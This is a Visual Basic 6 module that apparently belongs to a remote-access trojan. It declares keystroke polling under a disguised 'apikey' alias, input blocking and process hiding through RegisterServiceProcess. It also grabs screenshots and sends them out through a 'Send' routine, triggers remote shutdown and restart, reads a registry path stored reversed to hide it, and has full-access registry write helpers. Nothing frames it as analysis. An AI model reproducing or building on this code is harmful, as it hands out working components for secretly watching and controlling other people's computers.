Attribute VB_Name = "modAPIS"
Declare Function ExitWindowsEx Lib "user32" (ByVal dwOptions As Long, ByVal dwReserved As Long) As Long
Declare Function apikey Lib "user32" Alias "GetAsyncKeyState" (ByVal vKey As Long) As Integer

Public Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
Private Declare Function SetComputerName Lib "kernel32" Alias "SetComputerNameA" (ByVal lpComputerName As String) As Long

'<//Screen Shot_
Private Declare Sub keybd_event _
    Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, _
    ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
'Screen Shot//>

'<//Effect Screen_
Private mAlpha As Long

Public Const WS_EX_LAYERED As Long = &H80000
Public Const LWA_ALPHA As Long = &H2

Public Declare Function SetLayeredWindowAttributes Lib "user32" _
      (ByVal hwnd As Long, ByVal crKey As Long, _
      ByVal bAlpha As Long, ByVal dwFlags As Long) As Long

Public Const GWL_EXSTYLE = (-20)

Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" _
      (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long

Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" _
      (ByVal hwnd As Long, ByVal nIndex As Long) As Long


Private Const RDW_INVALIDATE = &H1
Private Const RDW_ERASE = &H4
Private Const RDW_ALLCHILDREN = &H80
Private Const RDW_FRAME = &H400

Private Declare Function RedrawWindow2 Lib "user32" Alias "RedrawWindow" _
      (ByVal hwnd As Long, ByVal lprcUpdate As Long, ByVal hrgnUpdate As Long, _
      ByVal fuRedraw As Long) As Long
Global pet As String
'Effect Screen//>

'<//RegValue_
Global LastKey As String
Global timeout As Byte
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function EnumWindows Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
    Public Const RSP_SIMPLE_SERVICE = 1
    Public Const RSP_UNREGISTER_SERVICE = 0

Public Type SECURITY_ATTRIBUTES
nLength As Long
lpSecurityDescriptor As Long
bInheritHandle As Long
End Type

Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" _
(ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, _
ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As _
Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal _
hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal _
dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long
Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" _
(ByVal hKey As Long, ByVal lpValueName As String) As Long
Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" _
(ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, _
ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, _
lpSecurityAttributes As SECURITY_ATTRIBUTES, phkResult As Long, _
lpdwDisposition As Long) As Long
Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String) As Long
Public Enum T_KeyClasses
HKEY_CLASSES_ROOT = &H80000000
HKEY_CURRENT_CONFIG = &H80000005
HKEY_CURRENT_USER = &H80000001
HKEY_LOCAL_MACHINE = &H80000002
HKEY_USERS = &H80000003
End Enum


Private Const SYNCHRONIZE = &H100000
Private Const STANDARD_RIGHTS_ALL = &H1F0000
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_LINK = &H20
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_EVENT = &H1
Private Const KEY_NOTIFY = &H10
Private Const READ_CONTROL = &H20000
Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or _
KEY_QUERY_VALUE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY _
Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or KEY_CREATE_LINK) _
And (Not SYNCHRONIZE))
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or _
KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) _
And (Not SYNCHRONIZE))
Private Const KEY_EXECUTE = (KEY_READ)
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or _
KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
Private Const REG_BINARY = 3
Private Const REG_CREATED_NEW_KEY = &H1
Private Const REG_DWORD = 4
Private Const REG_DWORD_BIG_ENDIAN = 5
Private Const REG_DWORD_LITTLE_ENDIAN = 4
Private Const REG_EXPAND_SZ = 2
Private Const REG_FULL_RESOURCE_DESCRIPTOR = 9
Private Const REG_LINK = 6
Private Const REG_MULTI_SZ = 7
Private Const REG_NONE = 0
Private Const REG_SZ = 1
Private Const REG_NOTIFY_CHANGE_ATTRIBUTES = &H2
Private Const REG_NOTIFY_CHANGE_LAST_SET = &H4
Private Const REG_NOTIFY_CHANGE_NAME = &H1
Private Const REG_NOTIFY_CHANGE_SECURITY = &H8
Private Const REG_OPTION_BACKUP_RESTORE = 4
Private Const REG_OPTION_CREATE_LINK = 2
Private Const REG_OPTION_NON_VOLATILE = 0
Private Const REG_OPTION_RESERVED = 0
Private Const REG_OPTION_VOLATILE = 1
Private Const REG_LEGAL_CHANGE_FILTER = (REG_NOTIFY_CHANGE_NAME _
Or REG_NOTIFY_CHANGE_ATTRIBUTES Or _
REG_NOTIFY_CHANGE_LAST_SET Or _
REG_NOTIFY_CHANGE_SECURITY)
Private Const REG_LEGAL_OPTION = (REG_OPTION_RESERVED Or _
REG_OPTION_NON_VOLATILE Or REG_OPTION_VOLATILE Or _
REG_OPTION_CREATE_LINK Or REG_OPTION_BACKUP_RESTORE)
'RegValue//>

'<//GlobalMemoryStatus_
Declare Sub GlobalMemoryStatus Lib "kernel32" (lpBuffer As MEMORYSTATUS)
Type MEMORYSTATUS
 dwLength As Long
 dwMemoryLoad As Long
 dwTotalPhys As Long
 dwAvailPhys As Long
 dwTotalPageFile As Long
 dwAvailPageFile As Long
 dwTotalVirtual As Long
 dwAvailVirtual As Long
 End Type
 'GlobalMemoryStatus//>

'<//Time_
Public Declare Function timeGetSystemTime Lib "winmm.dll" (lpTime As MMTIME, ByVal uSize As Long) As Long
Type smpte
      hour As Byte
      min As Byte
      sec As Byte
      frame As Byte
      fps As Byte
      dummy As Byte
      pad(2) As Byte
End Type
Type MMTIME
      wType As Long
      units As Long
      smtpeVal As smpte
      songptrpos As Long
End Type
'Time//>

Sub Pause(interval)
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub

Sub PrintText(Texty As String)

End Sub

Private Sub ScreenShot(Path As String)
Clipboard.Clear
Call keybd_event(44, 2, 0, 0)
DoEvents
    If Clipboard.GetFormat(vbCFBitmap) Then
        SavePicture Clipboard.GetData(vbCFBitmap), ("C:\PICTURE.BMP")
        Send "shotScreen|" & Clipboard.GetData(vbCFBitmap)
    Else
        Send "shotScreenError"
    End If
End Sub

Function SuspendPC() As Boolean
res = ExitWindowsEx(0, 0&)
End Function

Sub ShutdownPC()
Shell "cmd /c shutdown -s"
End Sub

Sub RestartPC()
Shell "cmd /c shutdown -r"
End Sub

Function GetRegValueR(ByVal key As String) As String
Dim tas As Object
Dim ste As String
ste = StrReverse(key)
Set tas = CreateObject("wscript.shell")
GetRegValueR = tas.regread(ste)
End Function

Public Function GetRegValue(KeyRoot As T_KeyClasses, Path As String, _
sKey As String) As String
Dim hKey As Long
Dim KeyValType As Long
Dim KeyValSize As Long
Dim KeyVal As String
Dim tmpVal As String
Dim res As Long
Dim i As Integer
res = RegOpenKeyEx(KeyRoot, Path, 0, KEY_ALL_ACCESS, hKey)
If res <> 0 Then GoTo Errore
tmpVal = String(1024, 0)
KeyValSize = 1024
res = RegQueryValueEx(hKey, sKey, 0, KeyValType, tmpVal, KeyValSize)
If res <> 0 Then GoTo Errore
If (Asc(Mid(tmpVal, KeyValSize, 1)) = 0) Then
tmpVal = Left(tmpVal, KeyValSize - 1)
Else
tmpVal = Left(tmpVal, KeyValSize)
End If
Select Case KeyValType
Case REG_SZ
KeyVal = tmpVal
Case REG_DWORD
For i = Len(tmpVal) To 1 Step -1
KeyVal = KeyVal + Hex(Asc(Mid(tmpVal, i, 1)))
Next
KeyVal = Format("&h" + KeyVal)
End Select
GetRegValue = KeyVal
RegCloseKey hKey
Exit Function
Errore:
GetRegValue = ""
RegCloseKey hKey
End Function

Public Function SetRegValue(KeyRoot As T_KeyClasses, Path As String, sKey As _
String, NewValue As String) As Boolean
Dim hKey As Long
Dim KeyValType As Long
Dim KeyValSize As Long
Dim KeyVal As String
Dim tmpVal As String
Dim res As Long
Dim i As Integer
Dim X As Long
res = RegOpenKeyEx(KeyRoot, Path, 0, KEY_ALL_ACCESS, hKey)
If res <> 0 Then GoTo Errore
tmpVal = String(1024, 0)
KeyValSize = 1024
res = RegQueryValueEx(hKey, sKey, 0, KeyValType, tmpVal, KeyValSize)
Select Case res
Case 2
KeyValType = REG_SZ
Case Is <> 0
GoTo Errore
End Select
Select Case KeyValType
Case REG_SZ
tmpVal = NewValue
Case REG_DWORD
X = Val(NewValue)
tmpVal = ""
For i = 0 To 3
tmpVal = tmpVal & Chr(X Mod 256)
X = X \ 256
Next
End Select
KeyValSize = Len(tmpVal)
res = RegSetValueEx(hKey, sKey, 0, KeyValType, tmpVal, KeyValSize)
If res <> 0 Then GoTo Errore
SetRegValue = True
RegCloseKey hKey
Exit Function
Errore:
SetRegValue = False
RegCloseKey hKey
End Function

Public Function ShellExecLaunchFile(ByVal strPathFile As String, ByVal strOpenInPath As String, ByVal strArguments As String) As Long
Dim Scr_hDC As Long
Scr_hDC = GetDesktopWindow()
ShellExecLaunchFile = ShellExecute(Scr_hDC, "Open", strPathFile, "", strOpenInPath, SW_SHOWNORMAL)
End Function

